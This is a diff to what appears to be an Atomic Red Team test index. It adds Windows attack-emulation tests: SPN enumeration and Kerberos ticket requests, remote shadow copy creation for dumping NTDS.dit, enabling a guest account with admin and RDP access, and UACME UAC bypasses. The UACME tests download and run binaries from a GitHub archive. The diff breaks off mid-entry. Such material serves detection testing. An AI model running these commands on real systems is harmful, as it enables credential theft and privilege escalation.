@@ -2584,6 +2584,94 @@ credential-access:
 '
         name: powershell
         elevation_required: false
+    - name: Extract all accounts in use as SPN using setspn
+      auto_generated_guid: e6f4affd-d826-4871-9a62-6c9004b8fe06
+      description: "The following test will utilize setspn to extract the Service
+        Principal Names. This behavior is typically used during a kerberos or silver
+        ticket attack. \nA successful execution will output all the SPNs for the related
+        domain. \n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        domain_name:
+          description: The Domain Name to lookup against
+          type: String
+          default: "%USERDNSDOMAIN%"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Computer must be domain joined
+
+'
+        prereq_command: 'if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain)
+          {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'Write-Host Joining this computer to a domain must be
+          done manually
+
+'
+      executor:
+        command: 'setspn -T #{domain_name} -Q */*
+
+'
+        name: command_prompt
+    - name: Request A Single Ticket via PowerShell
+      auto_generated_guid: 988539bc-2ed7-4e62-aec6-7c5cf6680863
+      description: "The following test will utilize native PowerShell Identity modules
+        to query the domain to extract the Service Principal Names for a single computer.
+        This behavior is typically used during a kerberos or silver ticket attack.
+        \nA successful execution will output the SPNs for the endpoint in question.\n"
+      supported_platforms:
+      - windows
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Computer must be domain joined
+
+'
+        prereq_command: 'if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain)
+          {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'Write-Host Joining this computer to a domain must be
+          done manually
+
+'
+      executor:
+        command: "Add-Type -AssemblyName System.IdentityModel\n$ComputerFQDN=$env:LogonServer.trimStart('\\')
+          + \".\" + $env:UserDnsDomain\nNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken
+          -ArgumentList \"HTTP/$ComputerFQDN\" \n"
+        name: powershell
+    - name: Request All Tickets via PowerShell
+      auto_generated_guid: 902f4ed2-1aba-4133-90f2-cff6d299d6da
+      description: "The following test will utilize native PowerShell Identity modules
+        to query the domain to extract allthe Service Principal Names. This behavior
+        is typically used during a kerberos or silver ticket attack. \nA successful
+        execution will output the SPNs for the domain in question.\n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        domain_name:
+          description: The Domain Name to lookup against
+          type: String
+          default: "%USERDNSDOMAIN%"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Computer must be domain joined
+
+'
+        prereq_command: 'if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain)
+          {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'Write-Host Joining this computer to a domain must be
+          done manually
+
+'
+      executor:
+        command: "Add-Type -AssemblyName System.IdentityModel  \nsetspn.exe -T #{domain_name}
+          -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken
+          -ArgumentList $_.Context.PostContext[0].Trim() }  \n"
+        name: powershell
   T1555.001:
     technique:
       created: '2020-02-12T18:55:24.728Z'
@@ -3869,7 +3957,7 @@ credential-access:
 
 '
         get_prereq_command: 'echo Run "Invoke-AtomicTest T1003.003 -TestName ''Create
-          Volume Shadow Copy with vassadmin''" to fulfuill this requirement
+          Volume Shadow Copy with vssadmin''" to fulfill this requirement
 
 '
       - description: 'Extract path must exist
@@ -3940,9 +4028,9 @@ credential-access:
       - windows
       input_arguments:
         drive_letter:
-          description: Drive letter to source VSC (including colon)
+          description: Drive letter to source VSC (including colon and backslash)
           type: String
-          default: 'C:'
+          default: C:\
       dependencies:
       - description: 'Target must be a Domain Controller
 
@@ -3957,6 +4045,40 @@ credential-access:
 '
       executor:
         command: 'wmic shadowcopy call create Volume=#{drive_letter}
+
+'
+        name: command_prompt
+        elevation_required: true
+    - name: Create Volume Shadow Copy remotely with WMI
+      auto_generated_guid: d893459f-71f0-484d-9808-ec83b2b64226
+      description: |
+        This test is intended to be run from a remote workstation with domain admin context.
+        The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.
+      supported_platforms:
+      - windows
+      input_arguments:
+        drive_letter:
+          description: Drive letter to source VSC (including colon and backslash)
+          type: String
+          default: C:\
+        target_host:
+          description: IP Address / Hostname you want to target
+          type: String
+          default: localhost
+      dependencies:
+      - description: 'Target must be a reachable Domain Controller, and current context
+          must be domain admin
+
+'
+        prereq_command: 'wmic /node:"#{target_host}" shadowcopy list brief
+
+'
+        get_prereq_command: 'echo Sorry, can''t connect to target host, check: network,
+          firewall or permissions (must be admin on target)
+
+'
+      executor:
+        command: 'wmic /node:"#{target_host}" shadowcopy call create Volume=#{drive_letter}
 
 '
         name: command_prompt
@@ -5105,7 +5227,7 @@ credential-access:
 
           $DomainUsers | Foreach-Object {
             $user = $_
-            $password = "#{password}"
+            $password = '#{password}'
 
             $credz = new-object System.Net.NetworkCredential($user, $password, "#{domain}")
             $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::#{auth})
@@ -11348,6 +11470,290 @@ privilege-escalation:
         command: "#{file_path}\n"
         name: command_prompt
         elevation_required: false
+    - name: UACME Bypass Method 23
+      auto_generated_guid: 8ceab7a2-563a-47d2-b5ba-0995211128d7
+      description: "Executes User Account Control Bypass according to the methods
+        listed below. Upon successful execution you should see event viewer load and
+        two administrative command prompts.\nNote: The cleanup_command's which kill
+        the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor:
+        Leo Davidson derivative\n\nType:\tDll Hijack\n\nMethod: IFileOperation\n\nTarget:\t\\system32\\pkgmgr.exe\n\nComponent:
+        DismCore.dll\n\nImplementation:\tucmDismMethod\n\nUCM Method:\tUacMethodDISM\n\nhttps://github.com/hfiref0x/UACME\n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        uacme_exe:
+          description: Path to uacme executable
+          type: Path
+          default: "%temp%\\uacme\\23 Akagi64.exe"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'UACME executable must exist on disk at specified location (#{uacme_exe})
+
+'
+        prereq_command: |
+          $tempPath = cmd /c echo #{uacme_exe}
+          if (Test-Path "$tempPath") {exit 0} else {exit 1}
+        get_prereq_command: |
+          Invoke-WebRequest "https://github.com/justaseckev/atomic-red-team/raw/master/atomics/T1548.002/src/UACMe%20binaries.zip" -OutFile "$env:TEMP\uacme.zip"
+          Expand-Archive $env:TEMP\uacme.zip $env:TEMP\uacme -Force
+          Remove-Item $env:TEMP\uacme.zip -Force
+      executor:
+        command: '"#{uacme_exe}"
+
+'
+        cleanup_command: |
+          powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
+          powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
+        name: command_prompt
+    - name: UACME Bypass Method 31
+      auto_generated_guid: b0f76240-9f33-4d34-90e8-3a7d501beb15
+      description: "Executes User Account Control Bypass according to the methods
+        listed below. Upon successful execution you should see event viewer load and
+        two administrative command prompts.\nNote: The cleanup_command's which kill
+        the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor:
+        Enigma0x3\n\nType:\tShell API\n\nMethod: Registry key manipulation\n\nTarget:\t\\system32\\sdclt.exe\n\nComponent:
+        Attacker defined\n\nImplementation:\tucmSdcltIsolatedCommandMethod\n\nUCM
+        Method:\tUacMethodShellSdclt\n\nhttps://github.com/hfiref0x/UACME\n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        uacme_exe:
+          description: Path to uacme executable
+          type: Path
+          default: "%temp%\\uacme\\31 Akagi64.exe"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'UACME executable must exist on disk at specified location (#{uacme_exe})
+
+'
+        prereq_command: |
+          $tempPath = cmd /c echo #{uacme_exe}
+          if (Test-Path "$tempPath") {exit 0} else {exit 1}
+        get_prereq_command: |
+          Invoke-WebRequest "https://github.com/justaseckev/atomic-red-team/raw/master/atomics/T1548.002/src/UACMe%20binaries.zip" -OutFile "$env:TEMP\uacme.zip"
+          Expand-Archive $env:TEMP\uacme.zip $env:TEMP\uacme -Force
+          Remove-Item $env:TEMP\uacme.zip -Force
+      executor:
+        command: '"#{uacme_exe}"
+
+'
+        cleanup_command: |
+          powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
+          powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
+        name: command_prompt
+    - name: UACME Bypass Method 33
+      auto_generated_guid: e514bb03-f71c-4b22-9092-9f961ec6fb03
+      description: "Executes User Account Control Bypass according to the methods
+        listed below. Upon successful execution you should see event viewer load and
+        two administrative command prompts.\nNote: The cleanup_command's which kill
+        the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor:
+        winscripting.blog\n\nType:\tShell API\n\nMethod: Registry key manipulation\n\nTarget:\t\\system32\\fodhelper.exe\n\nComponent:\tAttacker
+        defined\n\nImplementation:\tucmShellRegModMethod\n\nUCM Method:\tUacMethodMsSettings2\n\nhttps://github.com/hfiref0x/UACME\n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        uacme_exe:
+          description: Path to uacme executable
+          type: Path
+          default: "%temp%\\uacme\\33 Akagi64.exe"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'UACME executable must exist on disk at specified location (#{uacme_exe})
+
+'
+        prereq_command: |
+          $tempPath = cmd /c echo #{uacme_exe}
+          if (Test-Path "$tempPath") {exit 0} else {exit 1}
+        get_prereq_command: |
+          Invoke-WebRequest "https://github.com/justaseckev/atomic-red-team/raw/master/atomics/T1548.002/src/UACMe%20binaries.zip" -OutFile "$env:TEMP\uacme.zip"
+          Expand-Archive $env:TEMP\uacme.zip $env:TEMP\uacme -Force
+          Remove-Item $env:TEMP\uacme.zip -Force
+      executor:
+        command: '"#{uacme_exe}"
+
+'
+        cleanup_command: |
+          powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
+          powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
+        name: command_prompt
+    - name: UACME Bypass Method 34
+      auto_generated_guid: 695b2dac-423e-448e-b6ef-5b88e93011d6
+      description: "Executes User Account Control Bypass according to the methods
+        listed below. Upon successful execution you should see event viewer load and
+        two administrative command prompts.\nNote: The cleanup_command's which kill
+        the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor:
+        James Forshaw\n\nType:\tShell API\n\nMethod: Environment variables expansion\n\nTarget:\t\\system32\\svchost.exe
+        via \\system32\\schtasks.exe\n\nComponent:\tAttacker defined\n\nImplementation:\tucmDiskCleanupEnvironmentVariable\n\nUCM
+        Method:\tUacMethodDiskSilentCleanup\n\nhttps://github.com/hfiref0x/UACME\n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        uacme_exe:
+          description: Path to uacme executable
+          type: Path
+          default: "%temp%\\uacme\\34 Akagi64.exe"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'UACME executable must exist on disk at specified location (#{uacme_exe})
+
+'
+        prereq_command: |
+          $tempPath = cmd /c echo #{uacme_exe}
+          if (Test-Path "$tempPath") {exit 0} else {exit 1}
+        get_prereq_command: |
+          Invoke-WebRequest "https://github.com/justaseckev/atomic-red-team/raw/master/atomics/T1548.002/src/UACMe%20binaries.zip" -OutFile "$env:TEMP\uacme.zip"
+          Expand-Archive $env:TEMP\uacme.zip $env:TEMP\uacme -Force
+          Remove-Item $env:TEMP\uacme.zip -Force
+      executor:
+        command: '"#{uacme_exe}"
+
+'
+        cleanup_command: |
+          powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
+          powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
+        name: command_prompt
+    - name: UACME Bypass Method 39
+      auto_generated_guid: 56163687-081f-47da-bb9c-7b231c5585cf
+      description: "Executes User Account Control Bypass according to the methods
+        listed below. Upon successful execution you should see event viewer load and
+        two administrative command prompts.\nNote: The cleanup_command's which kill
+        the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor:
+        Stefan Kanthak\n\nType:\tDll Hijack\n\nMethod: .NET Code Profiler\n\nTarget:\t\\system32\\mmc.exe\n\nComponent:\tAttacker
+        defined\n\nImplementation:\tucmCorProfilerMethod\n\nUCM Method:\tUacMethodCorProfiler\n\nhttps://github.com/hfiref0x/UACME\n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        uacme_exe:
+          description: Path to uacme executable
+          type: Path
+          default: "%temp%\\uacme\\39 Akagi64.exe"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'UACME executable must exist on disk at specified location (#{uacme_exe})
+
+'
+        prereq_command: |
+          $tempPath = cmd /c echo #{uacme_exe}
+          if (Test-Path "$tempPath") {exit 0} else {exit 1}
+        get_prereq_command: |
+          Invoke-WebRequest "https://github.com/justaseckev/atomic-red-team/raw/master/atomics/T1548.002/src/UACMe%20binaries.zip" -OutFile "$env:TEMP\uacme.zip"
+          Expand-Archive $env:TEMP\uacme.zip $env:TEMP\uacme -Force
+          Remove-Item $env:TEMP\uacme.zip -Force
+      executor:
+        command: '"#{uacme_exe}"
+
+'
+        cleanup_command: |
+          powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
+          powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
+        name: command_prompt
+    - name: UACME Bypass Method 56
+      auto_generated_guid: 235ec031-cd2d-465d-a7ae-68bab281e80e
+      description: "Executes User Account Control Bypass according to the methods
+        listed below. Upon successful execution you should see event viewer load and
+        two administrative command prompts.\nNote: The cleanup_command's which kill
+        the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor:
+        Hashim Jawad\n\nType:\tShell API\n\nMethod: Registry key manipulation\n\nTarget:\t\\system32\\WSReset.exe\n\nComponent:\tAttacker
+        defined\n\nImplementation:\tucmShellRegModMethod\n\nUCM Method:\tUacMethodShellWSReset\n\nhttps://github.com/hfiref0x/UACME\n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        uacme_exe:
+          description: Path to uacme executable
+          type: Path
+          default: "%temp%\\uacme\\56 Akagi64.exe"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'UACME executable must exist on disk at specified location (#{uacme_exe})
+
+'
+        prereq_command: |
+          $tempPath = cmd /c echo #{uacme_exe}
+          if (Test-Path "$tempPath") {exit 0} else {exit 1}
+        get_prereq_command: |
+          Invoke-WebRequest "https://github.com/justaseckev/atomic-red-team/raw/master/atomics/T1548.002/src/UACMe%20binaries.zip" -OutFile "$env:TEMP\uacme.zip"
+          Expand-Archive $env:TEMP\uacme.zip $env:TEMP\uacme -Force
+          Remove-Item $env:TEMP\uacme.zip -Force
+      executor:
+        command: '"#{uacme_exe}"
+
+'
+        cleanup_command: |
+          powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
+          powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
+        name: command_prompt
+    - name: UACME Bypass Method 59
+      auto_generated_guid: dfb1b667-4bb8-4a63-a85e-29936ea75f29
+      description: "Executes User Account Control Bypass according to the methods
+        listed below. Upon successful execution you should see event viewer load and
+        two administrative command prompts.\nNote: The cleanup_command's which kill
+        the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor:
+        James Forshaw\n\nType:\tAppInfo ALPC\n\nMethod: RAiLaunchAdminProcess and
+        DebugObject\n\nTarget:\tAttacker defined\n\nComponent:\tAttacker defined\n\nImplementation:\tucmDebugObjectMethod\n\nUCM
+        Method:\tUacMethodDebugObject\n\nhttps://github.com/hfiref0x/UACME\n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        uacme_exe:
+          description: Path to uacme executable
+          type: Path
+          default: "%temp%\\uacme\\59 Akagi64.exe"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'UACME executable must exist on disk at specified location (#{uacme_exe})
+
+'
+        prereq_command: |
+          $tempPath = cmd /c echo #{uacme_exe}
+          if (Test-Path "$tempPath") {exit 0} else {exit 1}
+        get_prereq_command: |
+          Invoke-WebRequest "https://github.com/justaseckev/atomic-red-team/raw/master/atomics/T1548.002/src/UACMe%20binaries.zip" -OutFile "$env:TEMP\uacme.zip"
+          Expand-Archive $env:TEMP\uacme.zip $env:TEMP\uacme -Force
+          Remove-Item $env:TEMP\uacme.zip -Force
+      executor:
+        command: '"#{uacme_exe}"
+
+'
+        cleanup_command: |
+          powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
+          powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
+        name: command_prompt
+    - name: UACME Bypass Method 61
+      auto_generated_guid: 7825b576-744c-4555-856d-caf3460dc236
+      description: "Executes User Account Control Bypass according to the methods
+        listed below. Upon successful execution you should see event viewer load and
+        two administrative command prompts.\nNote: The cleanup_command's which kill
+        the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor:
+        Enigma0x3/bytecode77 derivative by Nassim Asrir\n\nType:\tShell API\n\nMethod:
+        Registry key manipulation\n\nTarget:\t\\system32\\slui.exe, \\system32\\changepk.exe\n\nComponent:\tAttacker
+        defined\n\nImplementation:\tucmShellRegModMethod\n\nUCM Method:\tUacMethodDebugObject\n\nhttps://github.com/hfiref0x/UACME\n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        uacme_exe:
+          description: Path to uacme executable
+          type: Path
+          default: "%temp%\\uacme\\61 Akagi64.exe"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'UACME executable must exist on disk at specified location (#{uacme_exe})
+
+'
+        prereq_command: |
+          $tempPath = cmd /c echo #{uacme_exe}
+          if (Test-Path "$tempPath") {exit 0} else {exit 1}
+        get_prereq_command: |
+          Invoke-WebRequest "https://github.com/justaseckev/atomic-red-team/raw/master/atomics/T1548.002/src/UACMe%20binaries.zip" -OutFile "$env:TEMP\uacme.zip"
+          Expand-Archive $env:TEMP\uacme.zip $env:TEMP\uacme -Force
+          Remove-Item $env:TEMP\uacme.zip -Force
+      executor:
+        command: '"#{uacme_exe}"
+
+'
+        cleanup_command: |
+          powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
+          powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
+        name: command_prompt
   T1574.012:
     technique:
       external_references:
@@ -12474,6 +12880,14 @@ privilege-escalation:
           description: Specify the guest password
           type: String
           default: Password123!
+        local_admin_group:
+          description: Specify the admin localgroup name
+          type: String
+          default: Administrators
+        remote_desktop_users_group_name:
+          description: Specify the remote desktop users group name
+          type: String
+          default: Remote Desktop Users
         remove_rdp_access_during_cleanup:
           description: Set to 1 if you want the cleanup to remove RDP access to machine
           type: Integer
@@ -12482,14 +12896,14 @@ privilege-escalation:
         command: |-
           net user #{guest_user} /active:yes
           net user #{guest_user} #{guest_password}
-          net localgroup administrators #{guest_user} /add
-          net localgroup "Remote Desktop Users" #{guest_user} /add
+          net localgroup #{local_admin_group} #{guest_user} /add
+          net localgroup "#{remote_desktop_users_group_name}" #{guest_user} /add
           reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
           reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f
         cleanup_command: |-
           net user #{guest_user} /active:no >nul 2>&1
-          net localgroup administrators #{guest_user} /delete >nul 2>&1
-          net localgroup "Remote Desktop Users" #{guest_user} /delete >nul 2>&1
+          net localgroup #{local_admin_group} #{guest_user} /delete >nul 2>&1
+          net localgroup "#{remote_desktop_users_group_name}" #{guest_user} /delete >nul 2>&1
           if #{remove_rdp_access_during_cleanup} NEQ 1 (echo Note: set remove_rdp_access_during_cleanup input argument to disable RDP access during cleanup)
           if #{remove_rdp_access_during_cleanup} EQU 1 (reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f >nul 2>&1)
           if #{remove_rdp_access_during_cleanup} EQU 1 (reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /f >nul 2>&1)
@@ -12503,11 +12917,16 @@ privilege-escalation:
 '
       supported_platforms:
       - windows
+      input_arguments:
+        guest_user:
+          description: Specify the guest account
+          type: String
+          default: guest
       executor:
-        command: 'net user guest /active:yes
+        command: 'net user #{guest_user} /active:yes
 
 '
-        cleanup_command: 'net user guest /active:no
+        cleanup_command: 'net user #{guest_user} /active:no
 
 '
         name: command_prompt
@@ -20765,6 +21184,290 @@ defense-evasion:
         command: "#{file_path}\n"
         name: command_prompt
         elevation_required: false
+    - name: UACME Bypass Method 23
+      auto_generated_guid: 8ceab7a2-563a-47d2-b5ba-0995211128d7
+      description: "Executes User Account Control Bypass according to the methods
+        listed below. Upon successful execution you should see event viewer load and
+        two administrative command prompts.\nNote: The cleanup_command's which kill
+        the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor:
+        Leo Davidson derivative\n\nType:\tDll Hijack\n\nMethod: IFileOperation\n\nTarget:\t\\system32\\pkgmgr.exe\n\nComponent:
+        DismCore.dll\n\nImplementation:\tucmDismMethod\n\nUCM Method:\tUacMethodDISM\n\nhttps://github.com/hfiref0x/UACME\n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        uacme_exe:
+          description: Path to uacme executable
+          type: Path
+          default: "%temp%\\uacme\\23 Akagi64.exe"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'UACME executable must exist on disk at specified location (#{uacme_exe})
+
+'
+        prereq_command: |
+          $tempPath = cmd /c echo #{uacme_exe}
+          if (Test-Path "$tempPath") {exit 0} else {exit 1}
+        get_prereq_command: |
+          Invoke-WebRequest "https://github.com/justaseckev/atomic-red-team/raw/master/atomics/T1548.002/src/UACMe%20binaries.zip" -OutFile "$env:TEMP\uacme.zip"
+          Expand-Archive $env:TEMP\uacme.zip $env:TEMP\uacme -Force
+          Remove-Item $env:TEMP\uacme.zip -Force
+      executor:
+        command: '"#{uacme_exe}"
+
+'
+        cleanup_command: |
+          powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
+          powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
+        name: command_prompt
+    - name: UACME Bypass Method 31
+      auto_generated_guid: b0f76240-9f33-4d34-90e8-3a7d501beb15
+      description: "Executes User Account Control Bypass according to the methods
+        listed below. Upon successful execution you should see event viewer load and
+        two administrative command prompts.\nNote: The cleanup_command's which kill
+        the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor:
+        Enigma0x3\n\nType:\tShell API\n\nMethod: Registry key manipulation\n\nTarget:\t\\system32\\sdclt.exe\n\nComponent:
+        Attacker defined\n\nImplementation:\tucmSdcltIsolatedCommandMethod\n\nUCM
+        Method:\tUacMethodShellSdclt\n\nhttps://github.com/hfiref0x/UACME\n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        uacme_exe:
+          description: Path to uacme executable
+          type: Path
+          default: "%temp%\\uacme\\31 Akagi64.exe"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'UACME executable must exist on disk at specified location (#{uacme_exe})
+
+'
+        prereq_command: |
+          $tempPath = cmd /c echo #{uacme_exe}
+          if (Test-Path "$tempPath") {exit 0} else {exit 1}
+        get_prereq_command: |
+          Invoke-WebRequest "https://github.com/justaseckev/atomic-red-team/raw/master/atomics/T1548.002/src/UACMe%20binaries.zip" -OutFile "$env:TEMP\uacme.zip"
+          Expand-Archive $env:TEMP\uacme.zip $env:TEMP\uacme -Force
+          Remove-Item $env:TEMP\uacme.zip -Force
+      executor:
+        command: '"#{uacme_exe}"
+
+'
+        cleanup_command: |
+          powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
+          powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
+        name: command_prompt
+    - name: UACME Bypass Method 33
+      auto_generated_guid: e514bb03-f71c-4b22-9092-9f961ec6fb03
+      description: "Executes User Account Control Bypass according to the methods
+        listed below. Upon successful execution you should see event viewer load and
+        two administrative command prompts.\nNote: The cleanup_command's which kill
+        the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor:
+        winscripting.blog\n\nType:\tShell API\n\nMethod: Registry key manipulation\n\nTarget:\t\\system32\\fodhelper.exe\n\nComponent:\tAttacker
+        defined\n\nImplementation:\tucmShellRegModMethod\n\nUCM Method:\tUacMethodMsSettings2\n\nhttps://github.com/hfiref0x/UACME\n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        uacme_exe:
+          description: Path to uacme executable
+          type: Path
+          default: "%temp%\\uacme\\33 Akagi64.exe"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'UACME executable must exist on disk at specified location (#{uacme_exe})
+
+'
+        prereq_command: |
+          $tempPath = cmd /c echo #{uacme_exe}
+          if (Test-Path "$tempPath") {exit 0} else {exit 1}
+        get_prereq_command: |
+          Invoke-WebRequest "https://github.com/justaseckev/atomic-red-team/raw/master/atomics/T1548.002/src/UACMe%20binaries.zip" -OutFile "$env:TEMP\uacme.zip"
+          Expand-Archive $env:TEMP\uacme.zip $env:TEMP\uacme -Force
+          Remove-Item $env:TEMP\uacme.zip -Force
+      executor:
+        command: '"#{uacme_exe}"
+
+'
+        cleanup_command: |
+          powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
+          powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
+        name: command_prompt
+    - name: UACME Bypass Method 34
+      auto_generated_guid: 695b2dac-423e-448e-b6ef-5b88e93011d6
+      description: "Executes User Account Control Bypass according to the methods
+        listed below. Upon successful execution you should see event viewer load and
+        two administrative command prompts.\nNote: The cleanup_command's which kill
+        the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor:
+        James Forshaw\n\nType:\tShell API\n\nMethod: Environment variables expansion\n\nTarget:\t\\system32\\svchost.exe
+        via \\system32\\schtasks.exe\n\nComponent:\tAttacker defined\n\nImplementation:\tucmDiskCleanupEnvironmentVariable\n\nUCM
+        Method:\tUacMethodDiskSilentCleanup\n\nhttps://github.com/hfiref0x/UACME\n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        uacme_exe:
+          description: Path to uacme executable
+          type: Path
+          default: "%temp%\\uacme\\34 Akagi64.exe"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'UACME executable must exist on disk at specified location (#{uacme_exe})
+
+'
+        prereq_command: |
+          $tempPath = cmd /c echo #{uacme_exe}
+          if (Test-Path "$tempPath") {exit 0} else {exit 1}
+        get_prereq_command: |
+          Invoke-WebRequest "https://github.com/justaseckev/atomic-red-team/raw/master/atomics/T1548.002/src/UACMe%20binaries.zip" -OutFile "$env:TEMP\uacme.zip"
+          Expand-Archive $env:TEMP\uacme.zip $env:TEMP\uacme -Force
+          Remove-Item $env:TEMP\uacme.zip -Force
+      executor:
+        command: '"#{uacme_exe}"
+
+'
+        cleanup_command: |
+          powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
+          powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
+        name: command_prompt
+    - name: UACME Bypass Method 39
+      auto_generated_guid: 56163687-081f-47da-bb9c-7b231c5585cf
+      description: "Executes User Account Control Bypass according to the methods
+        listed below. Upon successful execution you should see event viewer load and
+        two administrative command prompts.\nNote: The cleanup_command's which kill
+        the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor:
+        Stefan Kanthak\n\nType:\tDll Hijack\n\nMethod: .NET Code Profiler\n\nTarget:\t\\system32\\mmc.exe\n\nComponent:\tAttacker
+        defined\n\nImplementation:\tucmCorProfilerMethod\n\nUCM Method:\tUacMethodCorProfiler\n\nhttps://github.com/hfiref0x/UACME\n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        uacme_exe:
+          description: Path to uacme executable
+          type: Path
+          default: "%temp%\\uacme\\39 Akagi64.exe"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'UACME executable must exist on disk at specified location (#{uacme_exe})
+
+'
+        prereq_command: |
+          $tempPath = cmd /c echo #{uacme_exe}
+          if (Test-Path "$tempPath") {exit 0} else {exit 1}
+        get_prereq_command: |
+          Invoke-WebRequest "https://github.com/justaseckev/atomic-red-team/raw/master/atomics/T1548.002/src/UACMe%20binaries.zip" -OutFile "$env:TEMP\uacme.zip"
+          Expand-Archive $env:TEMP\uacme.zip $env:TEMP\uacme -Force
+          Remove-Item $env:TEMP\uacme.zip -Force
+      executor:
+        command: '"#{uacme_exe}"
+
+'
+        cleanup_command: |
+          powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
+          powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
+        name: command_prompt
+    - name: UACME Bypass Method 56
+      auto_generated_guid: 235ec031-cd2d-465d-a7ae-68bab281e80e
+      description: "Executes User Account Control Bypass according to the methods
+        listed below. Upon successful execution you should see event viewer load and
+        two administrative command prompts.\nNote: The cleanup_command's which kill
+        the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor:
+        Hashim Jawad\n\nType:\tShell API\n\nMethod: Registry key manipulation\n\nTarget:\t\\system32\\WSReset.exe\n\nComponent:\tAttacker
+        defined\n\nImplementation:\tucmShellRegModMethod\n\nUCM Method:\tUacMethodShellWSReset\n\nhttps://github.com/hfiref0x/UACME\n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        uacme_exe:
+          description: Path to uacme executable
+          type: Path
+          default: "%temp%\\uacme\\56 Akagi64.exe"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'UACME executable must exist on disk at specified location (#{uacme_exe})
+
+'
+        prereq_command: |
+          $tempPath = cmd /c echo #{uacme_exe}
+          if (Test-Path "$tempPath") {exit 0} else {exit 1}
+        get_prereq_command: |
+          Invoke-WebRequest "https://github.com/justaseckev/atomic-red-team/raw/master/atomics/T1548.002/src/UACMe%20binaries.zip" -OutFile "$env:TEMP\uacme.zip"
+          Expand-Archive $env:TEMP\uacme.zip $env:TEMP\uacme -Force
+          Remove-Item $env:TEMP\uacme.zip -Force
+      executor:
+        command: '"#{uacme_exe}"
+
+'
+        cleanup_command: |
+          powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
+          powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
+        name: command_prompt
+    - name: UACME Bypass Method 59
